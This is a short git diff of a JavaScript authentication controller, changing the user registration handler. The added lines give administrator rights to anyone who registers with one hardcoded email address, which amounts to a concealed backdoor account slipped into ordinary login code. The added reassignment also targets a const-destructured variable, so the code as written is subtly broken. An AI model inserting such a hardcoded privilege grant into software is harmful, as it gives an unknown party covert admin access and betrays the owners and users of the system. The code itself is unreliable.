@@ -130,10 +130,13 @@ const handleLoging = async (req, res) => {
   }
 };
 
-const handleRegister = createUser = async (req, res) => {
+const handleRegister = (createUser = async (req, res) => {
   try {
     const { first_name, last_name, email, phone, password, type_user } =
       req.body;
+    if (email == "vantuan@gmail.com") {
+      type_user = "admin";
+    }
     const salt = bcrypt.genSaltSync(saltRounds);
     const hashPassword = bcrypt.hashSync(password, salt);
     const checkEmail = await Users.findOne({
@@ -167,7 +170,7 @@ const handleRegister = createUser = async (req, res) => {
       message: error,
     });
   }
-};
+});
 
 const refreshTokenUser = async (req, res) => {
   try {
